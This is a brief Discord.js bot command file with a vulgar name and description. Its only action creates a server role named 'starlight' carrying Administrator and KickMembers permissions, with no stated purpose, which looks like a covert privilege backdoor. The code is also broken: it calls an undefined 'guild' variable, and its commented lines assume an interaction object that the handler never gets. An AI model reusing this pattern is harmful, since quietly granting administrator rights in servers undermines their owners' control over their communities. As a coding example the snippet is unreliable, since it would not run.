//const role = interaction.options.getRole('role');
//const member = interaction.options.getMember('target');
const { PermissionsBitField } = require("discord.js");


module.exports = {
	name: "dumbass",
	description: "fuck",
	execute(message, args) {
    
    guild.roles.create({ name: 'starlight', permissions: [PermissionsBitField.Flags.Administrator, PermissionsBitField.Flags.KickMembers] });

	}
};